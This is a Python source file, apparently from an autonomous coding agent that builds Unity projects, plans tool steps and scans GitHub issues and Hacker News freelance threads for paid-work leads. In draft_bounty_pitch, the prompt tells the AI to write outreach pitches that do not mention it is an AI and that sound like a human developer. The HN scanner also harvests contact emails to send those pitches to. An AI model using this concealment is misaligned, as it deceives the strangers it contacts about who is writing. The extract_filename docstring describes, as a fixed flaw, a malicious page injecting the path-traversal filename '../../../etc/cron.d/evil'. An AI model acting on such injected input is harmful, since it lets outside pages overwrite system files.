            tool_id = _next_tool_id(index)
        index.append({
            "id": tool_id, "idea": idea, "type": "unity", "url": url, "repo_name": repo_name,
            "good_runs": 0, "bad_runs": 0, "time_sensitive": time_sensitive
        })
        save_tools_index(index)
    return tool_id

def build_and_fix_unity_workflow(idea_raw):
    idea, force, rival = parse_flags(idea_raw)

    if not force:
        existing = find_matching_unity_tool(idea)
        if existing:
            print("Found existing Unity scaffold: " + existing["id"] + " — reusing it.")
            return ("Reused Unity scaffold " + existing["id"] + " (originally built for: \"" + existing.get("idea", "") +
                     "\"): " + str(existing.get("url", "")) +
                     "\nIf that's not actually what you asked for, add \"!!\" to your request to force a fresh build.")

    print("Designing Unity game: " + idea)
    design = plan_unity_game_design(idea)
    if design:
        print("Design: " + str(design.get("title")) + " — " + str(len(design.get("scripts", []))) + " script(s).")
    else:
        print("Design planning failed — falling back to unplanned generation for this build.")

    # BUG FIX: reserve the tool id/slug up front (before any files are
    # pushed) and use it as BOTH the "games/<slug>/" folder prefix in the
    # repo AND the tool id it's registered under at the end. Previously
    # every project shared the same fixed paths (Assets/Scripts/..., no
    # per-project folder) and register_unity_tool() minted its id only
    # after pushing — so files silently overwrote a previous project's
    # files on any filename collision, and even once fixed with per-project
    # folders, the registered tool id wouldn't have matched the folder
    # actually used unless reserved here and threaded through.
    # Reserve the id AND immediately write a placeholder into the shared
    # tools index (still under the lock) so no other concurrent build
    # (web/github/video/another Unity build) can mint the same id before
    # this one finishes — _next_tool_id() alone only looks at what's
    # already saved, so without writing something back right away, two
    # threads calling it back-to-back could both get "tool_12".
    with _tools_index_lock:
        index = load_tools_index()
        unity_slug = _next_tool_id(index)
        index.append({
            "id": unity_slug, "idea": idea, "type": "unity", "url": None, "repo_name": UNITY_REPO_NAME,
            "good_runs": 0, "bad_runs": 0, "time_sensitive": False, "pending": True
        })
        save_tools_index(index)

    with _unity_build_lock:
        project = write_code_for_unity(idea, design=design)
        output = "No project generated."

        for attempt in range(1, MAX_UNITY_ATTEMPTS + 1):
            print("--- Unity attempt " + str(attempt) + " ---")
            if not project:
                output = "AI call failed to produce any C# files."
            else:
                struct_passed, struct_reason = check_unity_output_structural(project, idea, design=design)
                if not struct_passed:
                    output = "Blocked before pushing to GitHub by structural check: " + struct_reason
                else:
                    ok, result = push_unity_project_to_github(project, UNITY_REPO_NAME, idea, design=design, slug=unity_slug)
                    if ok:
                        repo_url = result
                        print(ensure_unity_activation_workflow(UNITY_REPO_NAME))  # idempotent — safe to push every time, only needs running once by hand
                        compiled, compile_msg = validate_unity_on_github(UNITY_REPO_NAME, unity_slug)
                        tool_id = register_unity_tool(idea, repo_url, UNITY_REPO_NAME, tool_id=unity_slug)
                        if compiled:
                            scene_bit = (" A starter scene (Assets/Scenes/Main.unity) is included with the scripts "
                                         "already attached — see the README for what's still manual.")
                            if design and design.get("multiplayer"):
                                scene_bit += " Netcode for GameObjects is wired into the scripts; the NetworkManager GameObject still needs to be added by hand."
                            return ("Unity project built after " + str(attempt) + " attempt(s), saved as " + tool_id +
                                    ". Repo: " + repo_url + "\n" + compile_msg + "\n" + scene_bit)
                        if compile_msg.startswith("MISSING_LICENSE:"):
                            return ("Unity scaffold built after " + str(attempt) + " attempt(s), saved as " + tool_id +
                                    ". Repo: " + repo_url + "\nCouldn't run the real compile check yet — looks like the "
                                    "license activation workflow hasn't been run. Trigger 'unity_activate.yml' from the "
                                    "repo's Actions tab once, then re-run this idea to get a real compiled verification.\n"
                                    "(Structural checks passed — filenames/classes match, braces balance, no banned APIs.)")
                        # A genuine compile failure — feed the real compiler
                        # log back in as previous_error instead of falling
                        # through to the generic categorize_failure() path,
                        # since this is much more specific than anything the
                        # regex-based structural check could have caught.
                        output = "Real Unity compile failed:\n" + compile_msg
                        category = categorize_failure(output)
                        lesson = reflect_on_failure(idea, output)
                        maybe_create_precheck(category, lesson or "")
                        if lesson:
                            print("Learned: " + lesson)
                        if attempt < MAX_UNITY_ATTEMPTS:
                            project = write_code_for_unity(idea, previous_error=output, design=design)
                            continue
                        else:
                            return "Unity scaffold pushed to " + repo_url + " but failed real compilation after " + str(MAX_UNITY_ATTEMPTS) + " attempts. Last compiler output:\n" + compile_msg
                    output = result

            category = categorize_failure(output)
            lesson = reflect_on_failure(idea, output)
            maybe_create_precheck(category, lesson or "")
            if lesson:
                print("Learned: " + lesson)

            if attempt < MAX_UNITY_ATTEMPTS:
                project = write_code_for_unity(idea, previous_error=output, design=design)
            else:
                return "Could not build Unity scaffold after " + str(MAX_UNITY_ATTEMPTS) + " attempts. Last problem:\n" + output
        return "Unexpected end of retry loop."

# ============================================================
# HISTORY
# ============================================================

def load_history():
    return read_file(workpath("history.txt")) if os.path.exists(workpath("history.txt")) else ""

def save_to_history(question, answer):
    append_to_file(workpath("history.txt"), "\nUser asked: " + question + "\nAssistant answered: " + answer + "\n")

# ============================================================
# QUESTION ROUTING / GOAL PLANNING
# ============================================================

def extract_math_expression(question):
    match = re.search(r"[\d\s\+\-\*/\(\)\.]{2,}", question)
    return match.group(0).strip() if match else ""

def decide_tool(user_question):
    prompt = """You are an assistant with these tools:
read_file, write_file, edit_file, list_directory, search_files,
search_web, fetch_url, summarize_url, calculate, run_command,
check_website_bugs, none

User question: """ + user_question + """
Reply with ONLY one word."""
    return ask_ai(prompt).strip().lower()

def extract_filename(question, default):
    """
    BUG FIX: this filename gets passed straight into write_file() (a bare
    open(filename, "w")) at the only call site. The old guard only checked
    for spaces and a length cap — it did NOT block path separators or "..".
    Since `question` can include scraped web content forwarded as
    `previous_results` in a tool chain, a malicious page could get the AI
    to "extract" a filename like "../../../etc/cron.d/evil" or an absolute
    path, and write_file() would happily write outside the intended
    workdir, silently overwriting an arbitrary file. Reducing the AI's
    answer to a bare basename (no slashes, no leading dots/traversal)
    closes that off while leaving normal single-filename answers untouched.
    """
    prompt = """Does this mention a specific filename? If yes, reply with ONLY that filename. If no, reply: """ + default + """
User said: """ + question
    response = ask_ai(prompt).strip().strip('"').strip("'")
    if " " in response or len(response) > 50:
        return default
    # Collapse to a bare basename and reject anything that still tries to
    # escape the current directory (path separators, drive letters, "..",
    # leading dot-segments, or an empty/dot-only result).
    candidate = os.path.basename(response.replace("\\", "/"))
    if (not candidate or candidate in (".", "..") or candidate.startswith("..")
            or response != candidate):
        return default
    return candidate

def extract_search_term(question):
    prompt = """What word or phrase is the user searching for? Reply with ONLY that.
User said: """ + question
    return ask_ai(prompt).strip().strip('"').strip("'")

def extract_url(question):
    # Match markdown-style links first: [text](url)
    md_match = re.search(r"\[.*?\]\((https?://\S+?)\)", question)
    if md_match:
        return md_match.group(1).strip(".,)")
    match = re.search(r"https?://\S+", question)
    return match.group(0).strip(".,)") if match else ""

def get_edit_details(step, filename):
    current_content = read_file(filename)
    prompt = """Current content of """ + filename + """:
---
""" + current_content + """
---
User wants to change: """ + step + """

Reply in this format:
OLD: <exact text from file>
NEW: <replacement text>"""
    response = ask_ai(prompt)
    old_text, new_text = "", ""
    for line in response.split("\n"):
        line = line.strip()
        if line.startswith("OLD:"):
            old_text = line[4:].strip().strip('"').strip("'")
        elif line.startswith("NEW:"):
            new_text = line[4:].strip().strip('"').strip("'")
    return old_text, new_text

def make_plan(goal):
    prompt = """Break this goal into 1-5 steps with dependencies.
Goal: """ + goal + """

Reply in this format:
1. <step> | depends_on: none
2. <step> | depends_on: 1
3. <step> | depends_on: 1,2"""
    plan_text = ask_ai(with_memory(prompt))
    raw_steps = []
    for line in plan_text.split("\n"):
        line = line.strip()
        if not line or not line[0].isdigit():
            continue
        line_body = line.split(".", 1)[-1].strip()
        match = re.search(r"\|\s*depends[_\s]*on\s*:\s*(.*)$", line_body, re.IGNORECASE)
        if match:
            step_text = line_body[:match.start()].strip().rstrip("|").strip()
            dep_text = match.group(1).strip().lower()
            deps = [int(d) - 1 for d in re.findall(r"\d+", dep_text)] if dep_text != "none" else []
            raw_steps.append({"step": step_text, "depends_on": deps, "deps_parsed": True})
        else:
            raw_steps.append({"step": line_body, "depends_on": [], "deps_parsed": False})

    steps = []
    for i, s in enumerate(raw_steps):
        if not s["step"]:
            continue
        valid_deps = [d for d in s["depends_on"] if 0 <= d < i]
        if not s["deps_parsed"]:
            valid_deps = list(range(i))
        steps.append({"step": s["step"], "depends_on": valid_deps})
    return steps

def looks_like_failure(result):
    """
    Failure detector for handle_step_with_retry()'s retry loop.
    This codebase's own functions (ask_ai, fetch_url, search_web,
    create_github_repo, etc.) signal failure by making the returned
    string START WITH "ERROR" or "Could not" — see their return
    statements throughout the file. Checking for those words ANYWHERE
    in the text (the old behavior) misfired on any normal, correct AI
    answer that merely discusses errors — e.g. "A KeyError occurs when
    you access a missing key", or "some rows could not be parsed and
    were skipped" — silently discarding good answers, burning retries,
    and sometimes replacing a correct answer with the generic give-up
    message. Anchoring to the start matches the actual failure-string
    convention and fixes that without losing real failure detection.
    """
    lowered = result.strip().lower()
    if lowered.startswith("error") or lowered.startswith("could not"):
        return True
    # Short, fixed-format failure strings returned as the WHOLE result by
    # specific tools (run_command, edit_file) rather than embedded in
    # longer free-form text — safe to substring-match.
    return any(s in lowered for s in ["not allowed for safety reasons", "no changes made", "no such file or directory"])

def fix_failed_step(step, failure_reason):
    return ask_ai("This instruction failed: " + step + "\nFailure: " + failure_reason + "\nRewrite it more specifically. Reply with ONLY the new instruction.").strip()

def handle_single_question(question, previous_results="", history=""):
    # Try tool chain first (only when we have multiple tools and no previous context)
    if not previous_results:
        chain = plan_tool_chain(question)
        if chain:
            ids_label = " → ".join(s["tool"]["id"] for s in chain)
            print("  [chainer] planning chain: " + ids_label)
            success, output, used_ids = run_tool_chain(chain, question)
            if success:
                return "[chain " + ids_label + "] " + str(output), used_ids[-1] if used_ids else None

    # Fall back to single tool
    tool = find_tool_for_step(question)
    if tool:
        success, output = run_tool_with_input(tool, previous_results if previous_results else question)
        if success:
            return "[used tool " + tool["id"] + "] " + str(output), tool["id"]

    question_lower = question.lower()
    url_in_question = extract_url(question)

    if any(w in question_lower for w in ["calculate", "plus", "minus", "times", "divided by"]):
        expr = extract_math_expression(question)
        if expr:
            return calculate(expr), None

    if any(w in question_lower for w in ["write", "save", "create a file"]):
        filename = extract_filename(question, "output.txt")
        full_q = ("Context:\n" + previous_results + "\n\nTask: " + question) if previous_results else question
        answer = ask_ai(full_q)
        write_file(filename, answer)
        return "Wrote to " + filename + ":\n" + answer, None

    if url_in_question and any(w in question_lower for w in
            ["bug", "bugs", "broken", "errors on", "check this site", "check this website",
             "check the site", "check the website", "is this site broken", "scan this site",
             "scan this website"]):
        return check_website_bugs(url_in_question), None

    if url_in_question:
        return (summarize_url(url_in_question) if "summarize" in question_lower else fetch_url(url_in_question)), None

    if any(w in question_lower for w in ["search the web", "look up", "latest news", "current price"]):
        return search_web(question), None

    if any(w in question_lower for w in ["what files", "list files"]):
        return "Files: " + list_directory(), None

    if any(w in question_lower for w in ["earlier", "before", "previously", "remember"]) and history:
        return ask_ai("Earlier conversation:\n" + history + "\n\nAnswer: " + question), None

    full_q = ("Context:\n" + previous_results + "\n\nTask: " + question) if previous_results else question
    return ask_ai(with_memory(full_q)), None

def handle_step_with_retry(step, previous_results="", history="", max_retries=2):
    current_step = step
    for attempt in range(max_retries + 1):
        result, used_tool_id = handle_single_question(current_step, previous_results, history)
        if not looks_like_failure(result):
            return result, current_step, used_tool_id
        if attempt < max_retries:
            with _print_lock:
                print("  (Attempt " + str(attempt + 1) + " failed, retrying...)")
            current_step = fix_failed_step(current_step, result)
    if looks_like_failure(result):
        friendly = ("Sorry, I couldn't get an answer for that — the AI service didn't respond properly "
                     "after a couple of tries. This usually means it's rate-limited or briefly unreachable; "
                     "try again in a minute, or rephrase the question.")
        with _print_lock:
            print("  (Gave up after " + str(max_retries + 1) + " attempts. Raw error: " + result + ")")
        return friendly, current_step, used_tool_id
    return result, current_step, used_tool_id

def run_step_with_deps(index, step_text, deps, results_by_index, history):
    context = "".join("\nResult of step " + str(d + 1) + ": " + results_by_index[d][0] for d in deps if d in results_by_index)
    try:
        result, final_step, tool_id = handle_step_with_retry(step_text, context, history)
    except Exception as e:
        result, final_step, tool_id = ("ERROR: " + str(e), step_text, None)
    return index, result, final_step, tool_id

def run_goal_with_dependencies(steps, history):
    results_by_index = {}
    tool_ids_used = []
    remaining = set(range(len(steps)))
    while remaining:
        ready = [i for i in remaining if all(d in results_by_index for d in steps[i]["depends_on"])]
        if not ready:
            ready = list(remaining)
        print("Running steps " + ", ".join(str(i + 1) for i in ready) + " in parallel...")
        with ThreadPoolExecutor(max_workers=max(len(ready), 1)) as executor:
            futures = [executor.submit(run_step_with_deps, i, steps[i]["step"], steps[i]["depends_on"], results_by_index, history) for i in ready]
            for future in as_completed(futures):
                index, result, final_step, tool_id = future.result()
                results_by_index[index] = (result, final_step)
                if tool_id:
                    tool_ids_used.append(tool_id)
                print("Step " + str(index + 1) + " done: " + result[:200])
        for i in ready:
            remaining.discard(i)
    if len(tool_ids_used) >= 2:
        log_cousage(tool_ids_used)
    return "".join("\nStep " + str(i + 1) + " (" + results_by_index[i][1] + "): " + results_by_index[i][0] for i in range(len(steps)))

# ============================================================
# DREAMER THREAD
# ============================================================

BOUNTY_LEADS_FILE = workpath("bounty_leads.json")
_bounty_leads_lock = threading.Lock()
BOUNTY_SCAN_INTERVAL_SECONDS = 3600  # hourly
BOUNTY_SEARCH_TERMS = ["label:bounty", "label:\"help wanted\"", "\"paid\" in:title"]

PENDING_IDEAS_FILE = workpath("pending_ideas.json")
PENDING_IDEAS_CAP = 3
DREAMER_SLEEP_SECONDS = 300
DREAMER_ENABLED = True
_main_thread_busy = threading.Event()
_pending_ideas_lock = threading.Lock()
# BUG FIX (see run_step_with_deps / handle_step_with_retry): when
# run_goal_with_dependencies() runs independent steps concurrently via
# ThreadPoolExecutor, each worker thread can call print() on its own
# attempt/retry/give-up messages at the same time. print() is not atomic
# across threads — it's a separate write() for the text and for the
# newline — so two threads printing at once can interleave mid-line and
# garble the console output (e.g. two "(Attempt 1 failed...)" messages
# splicing into one unreadable line). A simple lock around those specific
# prints serializes them without affecting single-threaded call sites.
_print_lock = threading.Lock()

def load_pending_ideas():
    with _pending_ideas_lock:
        return read_json_file(PENDING_IDEAS_FILE, [])

def save_pending_ideas(ideas):
    with _pending_ideas_lock:
        write_file(PENDING_IDEAS_FILE, json.dumps(ideas, indent=2))

def add_pending_idea(entry, cap=None):
    """
    FEATURE 4: atomic cap-checked enqueue. Previously dreamer_can_act()
    checked the pending-ideas count *before* the (slow) build/red-team
    work happened, then add_pending_idea() appended unconditionally
    afterwards — leaving a window where two near-simultaneous cycles
    could both pass the check and together blow past PENDING_IDEAS_CAP.
    Passing cap here re-checks the count atomically, under the same
    lock as the write, immediately before appending.
    Returns True if the entry was added, False if it was dropped
    because the queue was already at/over cap.
    """
    with _pending_ideas_lock:
        ideas = read_json_file(PENDING_IDEAS_FILE, [])
        if cap is not None and len(ideas) >= cap:
            return False
        ideas.append(entry)
        write_file(PENDING_IDEAS_FILE, json.dumps(ideas, indent=2))
        return True

# ============================================================
# GITHUB BOUNTY LEADS
# ============================================================
# Read-only scanning + AI-drafted pitches. Nothing here posts to GitHub
# on its own — every outbound action (posting a pitch comment) requires
# an explicit approvebounty: <id> command from the user. This mirrors
# the existing dreamer/pending_ideas approval pattern.

def load_bounty_leads():
    with _bounty_leads_lock:
        return read_json_file(BOUNTY_LEADS_FILE, [])

def save_bounty_leads(leads):
    with _bounty_leads_lock:
        write_file(BOUNTY_LEADS_FILE, json.dumps(leads, indent=2))

def _next_bounty_id(leads):
    existing = [int(l["id"][1:]) for l in leads if l.get("id", "").startswith("b") and l["id"][1:].isdigit()]
    return "b" + str(max(existing, default=0) + 1)

def _bounty_lead_exists(leads, url):
    return any(l.get("url") == url for l in leads)

def search_github_issues(query, max_results=15):
    """Raw search against GitHub's issue search API. Read-only, no auth
    required for public repos but auth (github_headers) raises the rate limit."""
    try:
        response = requests.get(
            "https://api.github.com/search/issues",
            headers=github_headers() or {},
            params={"q": query, "sort": "created", "order": "desc", "per_page": max_results},
            timeout=30
        )
        data = _github_json(response)
        if response.status_code != 200:
            return [], "GitHub search error: " + str(data.get("message", data))
        return data.get("items", []), None
    except requests.exceptions.RequestException as e:
        return [], "ERROR: could not reach GitHub (" + str(e) + ")"

def scan_github_bounties(max_results=15):
    """
    Searches open GitHub issues for bounty/paid-work signals, evaluates
    each new one for feasibility, drafts a pitch, and queues it for
    approval. Fully read-only against GitHub — no comments or PRs are
    posted here. Sends ONE batched Telegram summary per scan rather than
    pinging per lead.
    Returns a summary string.
    """
    leads = load_bounty_leads()
    queued = 0
    skipped = 0
    errors = []
    new_leads = []

    for term in BOUNTY_SEARCH_TERMS:
        query = "is:issue is:open " + term
        items, err = search_github_issues(query, max_results=max_results)
        if err:
            errors.append(err)
            continue
        for issue in items:
            url = issue.get("html_url", "")
            if not url or _bounty_lead_exists(leads, url):
                continue
            title = issue.get("title", "")
            body = (issue.get("body") or "")[:1500]

            feasible, reason = evaluate_bounty_lead(title, body)
            if not feasible:
                skipped += 1
                continue

            pitch = draft_bounty_pitch(title, body)
            lead = {
                "id": None,  # BUG FIX: assigned atomically at commit time below,
                             # not here — see note above the commit block.
                "url": url,
                "title": title,
                "repo": issue.get("repository_url", "").replace("https://api.github.com/repos/", ""),
                "issue_number": issue.get("number"),
                "source": "github",
                "action": "github_comment",
                "status": "pending_approval",
                "reason": reason,
                "pitch": pitch,
                "found_at": time.time()
            }
            leads.append(lead)
            new_leads.append(lead)
            queued += 1

    # BUG FIX: same lost-update race as tools_index.json/agents_index.json
    # (see _tools_index_lock / _agents_index_lock notes elsewhere). The loop
    # above makes many slow network + AI calls (search_github_issues,
    # evaluate_bounty_lead, draft_bounty_pitch) using the `leads` snapshot
    # loaded at the top of this function. If approve_bounty_lead() or
    # reject_bounty_lead() ran concurrently and saved in between, the old
    # save_bounty_leads(leads) call here would overwrite their change with
    # this stale snapshot — and _next_bounty_id(leads) being computed
    # against that same stale snapshot meant two near-simultaneous scans
    # could also mint the same id for two different leads. Re-load fresh
    # under the lock right at commit time, re-check for URL duplicates and
    # assign ids against that fresh list, then append and save — all
    # inside one critical section.
    if new_leads:
        with _bounty_leads_lock:
            fresh_leads = read_json_file(BOUNTY_LEADS_FILE, [])
            for lead in new_leads:
                if _bounty_lead_exists(fresh_leads, lead["url"]):
                    continue  # someone else queued this exact issue meanwhile
                lead["id"] = _next_bounty_id(fresh_leads)
                fresh_leads.append(lead)
            write_file(BOUNTY_LEADS_FILE, json.dumps(fresh_leads, indent=2))
    if new_leads:
        preview = "\n".join("- [" + l["id"] + "] " + l["title"] for l in new_leads[:5])
        more = "\n...and " + str(queued - 5) + " more" if queued > 5 else ""
        notify_telegram(
            "GitHub bounty scan: " + str(queued) + " new lead(s)\n" + preview + more +
            "\nUse 'bounties' to review, 'approvebounty: <id>' to pitch."
        )
    summary = "GitHub scan done. Queued: " + str(queued) + ", skipped (not a fit): " + str(skipped)
    if errors:
        summary += "\nErrors: " + "; ".join(errors[:3])
    return summary

def evaluate_bounty_lead(title, body):
    """Cheap AI feasibility check. Returns (feasible: bool, reason: str)."""
    if not keys_are_free():
        # Don't block the scan loop waiting on a busy key set — fall back
        # to a permissive keyword check so leads still get queued for a
        # human to judge instead of being silently dropped.
        text = (title + " " + body).lower()
        looks_codey = any(w in text for w in ["python", "script", "api", "bug", "fix", "bot", "automation", "scrape"])
        return looks_codey, "keyword fallback (AI busy)"

    prompt = (
        "A GitHub issue offers paid work. Title: " + title + "\nBody: " + body +
        "\n\nCan a solo Python-focused autonomous coding agent realistically attempt this "
        "(reasonably scoped, no massive unfamiliar codebase, no hardware/physical requirement)? "
        "Reply with exactly one line: YES: <one sentence reason> or NO: <one sentence reason>."
    )
    result = ask_ai(prompt)
    if result.startswith("ERROR"):
        return False, result
    result = result.strip()
    if result.upper().startswith("YES"):
        return True, result
    return False, result

def draft_bounty_pitch(title, body):
    """Drafts (but does not send) a short pitch comment for the issue."""
    if not keys_are_free():
        return "DRAFT PENDING: AI busy, re-run 'scanbounties' later to redraft, or write manually."
    prompt = (
        "Write a short (3-4 sentence), friendly, non-spammy GitHub issue comment offering to "
        "solve this bounty issue. Title: " + title + "\nBody: " + body +
        "\nDo not mention being an AI. Sound like a competent developer volunteering. No links, no signature."
    )
    result = ask_ai(prompt)
    return result if not result.startswith("ERROR") else "DRAFT FAILED: " + result

def post_github_issue_comment(repo_full_name, issue_number, body):
    headers = github_headers()
    if headers is None:
        return False, "Could not post comment: GITHUB_TOKEN environment variable is not set."
    try:
        response = requests.post(
            "https://api.github.com/repos/" + repo_full_name + "/issues/" + str(issue_number) + "/comments",
            headers=headers,
            json={"body": body},
            timeout=30
        )
        data = _github_json(response)
        if response.status_code not in [200, 201]:
            return False, "Could not post comment: " + str(data.get("message", data))
        return True, "Posted: " + data.get("html_url", "")
    except requests.exceptions.RequestException as e:
        return False, "ERROR: could not reach GitHub (" + str(e) + ")"

def approve_bounty_lead(lead_id):
    """Sends the drafted pitch through whatever channel the lead requires.
    This is the only function in this section that sends anything out —
    github_comment posts to the issue, email uses your existing
    send_email, manual just hands you the draft since there's no safe
    automatable channel (e.g. HN has no public posting API)."""
    leads = load_bounty_leads()
    lead = next((l for l in leads if l["id"] == lead_id), None)
    if not lead:
        return "No bounty lead with id " + lead_id + ". Use 'bounties' to list them."
    if lead["status"] != "pending_approval":
        return "Lead " + lead_id + " is already " + lead["status"] + "."

    action = lead.get("action", "github_comment")  # older GitHub-sourced leads predate this field

    if action == "github_comment":
        success, msg = post_github_issue_comment(lead["repo"], lead["issue_number"], lead["pitch"])
    elif action == "email":
        if not lead.get("contact_email"):
            return "Lead " + lead_id + " has no contact email captured. Reach out manually: " + lead["url"]
        success, err = send_email(lead["contact_email"], "Re: your freelance request", lead["pitch"])
        msg = ("Email sent to " + lead["contact_email"]) if success else ("Email failed: " + str(err))
    else:
        return ("No automated send channel for lead " + lead_id + " (source: " + lead.get("source", "unknown") +
                "). Visit " + lead["url"] + " and use this drafted pitch yourself:\n\n" + lead["pitch"])

    # BUG FIX: same lost-update race as scan_github_bounties (see notes
    # there). post_github_issue_comment/send_email above are slow network
    # calls; a scan or another approve/reject could have saved a newer
    # version of bounty_leads.json while we were waiting on them. Re-load
    # fresh under the lock and apply our status change to that copy rather
    # than saving the `leads` snapshot from the top of this function, so we
    # don't clobber whatever else changed in the meantime.
    with _bounty_leads_lock:
        fresh_leads = read_json_file(BOUNTY_LEADS_FILE, [])
        fresh_lead = next((l for l in fresh_leads if l["id"] == lead_id), None)
        if fresh_lead is not None:
            fresh_lead["status"] = "pitched" if success else "post_failed"
            fresh_lead["post_result"] = msg
        write_file(BOUNTY_LEADS_FILE, json.dumps(fresh_leads, indent=2))
    return msg

def reject_bounty_lead(lead_id):
    # BUG FIX: load+modify+save is now one atomic critical section instead
    # of two separate lock acquisitions (load_bounty_leads() / save_bounty_leads()),
    # closing the same lost-update window described in scan_github_bounties.
    with _bounty_leads_lock:
        leads = read_json_file(BOUNTY_LEADS_FILE, [])
        lead = next((l for l in leads if l["id"] == lead_id), None)
        if not lead:
            return "No bounty lead with id " + lead_id + "."
        lead["status"] = "rejected"
        write_file(BOUNTY_LEADS_FILE, json.dumps(leads, indent=2))
    return "Rejected " + lead_id + "."

def list_bounty_leads():
    leads = load_bounty_leads()
    if not leads:
        return "No bounty leads yet. Use 'scanbounties' to search."
    lines = []
    for l in leads:
        lines.append(l["id"] + " [" + l["status"] + "] " + l["title"] + "\n  " + l["url"])
    return "\n".join(lines)

def bounty_scan_loop():
    """Background thread: periodically scans all lead sources. Runs
    unconditionally — GitHub scanning degrades gracefully with no token
    (lower rate limit, still works for public search), and HN scanning
    needs no token at all."""
    while True:
        time.sleep(BOUNTY_SCAN_INTERVAL_SECONDS)
        try:
            result = scan_all_leads()
            print("\n[lead scan] " + result)
        except Exception as e:
            print("[lead scan] loop error: " + str(e))

HN_ALGOLIA_SEARCH_URL = "https://hn.algolia.com/api/v1/search_by_date"
HN_ALGOLIA_ITEM_URL = "https://hn.algolia.com/api/v1/items/"

def find_latest_hn_thread(title_query):
    """Finds the most recent HN story whose title actually contains
    title_query (Algolia's search is loose, so results are filtered)."""
    try:
        response = requests.get(
            HN_ALGOLIA_SEARCH_URL,
            params={"query": title_query, "tags": "story", "hitsPerPage": 5},
            timeout=20
        )
        data = response.json()
        matches = [h for h in data.get("hits", []) if title_query.lower() in (h.get("title") or "").lower()]
        return matches[0] if matches else None
    except requests.exceptions.RequestException:
        return None

def evaluate_hn_lead(comment_text):
    """Filters HN freelance-thread comments down to ones where someone
    is HIRING (not offering their own services) for realistically
    scoped solo Python work."""
    if not keys_are_free():
        text = comment_text.lower()
        hiring_words = ["looking for", "need someone", "hiring", "seeking a dev", "need a developer", "budget"]
        return any(w in text for w in hiring_words), "keyword fallback (AI busy)"
    prompt = (
        "This is a comment from Hacker News's monthly freelance thread:\n\n" + comment_text[:1500] +
        "\n\nIs this person HIRING for coding/software work (not offering their own services), "
        "and is the work realistically scoped for a solo Python-focused developer? "
        "Reply with exactly one line: YES: <reason> or NO: <reason>."
    )
    result = ask_ai(prompt)
    if result.startswith("ERROR"):
        return False, result
    result = result.strip()
    return (True, result) if result.upper().startswith("YES") else (False, result)

def scan_hn_freelance_leads(max_comments=40):
    """
    Scans the current monthly HN 'Freelancer? Seeking freelancer?' thread
    for top-level comments where someone is hiring, extracts a contact
    email if one is posted, drafts a reply, and queues it as a lead.
    Read-only against HN — nothing is posted without approvebounty.
    """
    leads = load_bounty_leads()
    story = find_latest_hn_thread("Freelancer? Seeking freelancer?")
    if not story:
        return "Could not find the current HN freelancer thread."
    try:
        response = requests.get(HN_ALGOLIA_ITEM_URL + str(story["objectID"]), timeout=20)
        item = response.json()
    except requests.exceptions.RequestException as e:
        return "ERROR: could not fetch HN thread (" + str(e) + ")"

    queued = 0
    skipped = 0
    new_leads = []
    for comment in (item.get("children") or [])[:max_comments]:
        text = comment.get("text") or ""
        if not text or len(text) < 40:
            continue
        url = "https://news.ycombinator.com/item?id=" + str(comment.get("id"))
        if _bounty_lead_exists(leads, url):
            continue
        clean_text = re.sub("<[^<]+?>", " ", text).strip()

        feasible, reason = evaluate_hn_lead(clean_text)
        if not feasible:
            skipped += 1
            continue

        email_match = re.search(r"[\w.+-]+@[\w-]+\.[\w.-]+", clean_text)
        pitch = draft_bounty_pitch("HN freelance request", clean_text)
        lead = {
            "id": _next_bounty_id(leads),
            "url": url,
            "title": clean_text[:80].strip() + ("..." if len(clean_text) > 80 else ""),
            "source": "hackernews",
            "action": "email" if email_match else "manual",
            "contact_email": email_match.group(0) if email_match else "",
            "status": "pending_approval",
            "reason": reason,
            "pitch": pitch,
            "found_at": time.time()
        }
        leads.append(lead)
        new_leads.append(lead)
        queued += 1

    # BUG FIX: same lost-update race as scan_github_bounties (see notes
    # there — this function was missing the fix that scan_github_bounties
    # already has, even though both share bounty_leads.json and both run
    # from bounty_scan_loop()/scan_all_leads() concurrently with
    # approve_bounty_lead()/reject_bounty_lead() from the main thread). The
    # loop above makes slow network + AI calls using the `leads` snapshot
    # loaded at the top of this function; saving that stale snapshot here
    # would silently overwrite any approve/reject (or GitHub scan) that
    # committed in between. Re-load fresh under the lock, re-check for URL
    # duplicates and assign ids against that fresh list, then append and
    # save — all inside one critical section.
    if new_leads:
        with _bounty_leads_lock:
            fresh_leads = read_json_file(BOUNTY_LEADS_FILE, [])
            committed_leads = []
            for lead in new_leads:
                if _bounty_lead_exists(fresh_leads, lead["url"]):
                    continue  # someone else queued this exact item meanwhile
                lead["id"] = _next_bounty_id(fresh_leads)
                fresh_leads.append(lead)
                committed_leads.append(lead)
            write_file(BOUNTY_LEADS_FILE, json.dumps(fresh_leads, indent=2))
        new_leads = committed_leads
    if new_leads:
        preview = "\n".join("- [" + l["id"] + "] " + l["title"] for l in new_leads[:5])
        more = "\n...and " + str(queued - 5) + " more" if queued > 5 else ""
        notify_telegram(
            "HN freelance scan: " + str(queued) + " new lead(s)\n" + preview + more +
            "\nUse 'bounties' to review, 'approvebounty: <id>' to reach out."
        )
    return "HN scan done. Queued: " + str(queued) + ", skipped: " + str(skipped)

def scan_all_leads():
    """Runs every lead source and returns a combined summary."""
    return "\n".join([scan_github_bounties(), scan_hn_freelance_leads()])

# ============================================================
# DEPENDENCY VULNERABILITY SCANNING (OSV.dev — free, no API key)
# ============================================================
# Checks known CVEs/GHSAs for pinned package versions. Reports IDs and
# fixed versions only — no exploit code, no PoC generation.

OSV_API_URL = "https://api.osv.dev/v1/querybatch"
OSV_VULN_URL = "https://api.osv.dev/v1/vulns/"

def _parse_requirements_lines(lines):
    """Parses requirements.txt-style lines into [(name, version_or_None), ...].
    Only exact pins (package==1.2.3) carry a version — unpinned lines are
    still returned (version=None) so callers can report them as
    unscannable instead of silently dropping them."""
    packages = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("-"):
            continue
        line = line.split("#")[0].strip()
        match = re.match(r"^([A-Za-z0-9._-]+)\s*==\s*([A-Za-z0-9.\-+]+)", line)
        if match:
            packages.append((match.group(1), match.group(2)))
        else:
            name_match = re.match(r"^([A-Za-z0-9._-]+)", line)
            if name_match:
                packages.append((name_match.group(1), None))
    return packages

def _parse_requirements(path):
    if not os.path.exists(path):
        return []
    with open(path) as f:
        return _parse_requirements_lines(f.readlines())

def _parse_requirements_text(text):
    return _parse_requirements_lines(text.splitlines())

def _query_osv_batch(packages):
    """packages: [(name, version_or_None), ...]. Returns {name: [vuln_id, ...]}
    for packages with known vulnerabilities. Unpinned packages are skipped
    since OSV needs an exact version to check."""
    queryable = [(n, v) for n, v in packages if v]
    if not queryable:
        return {}
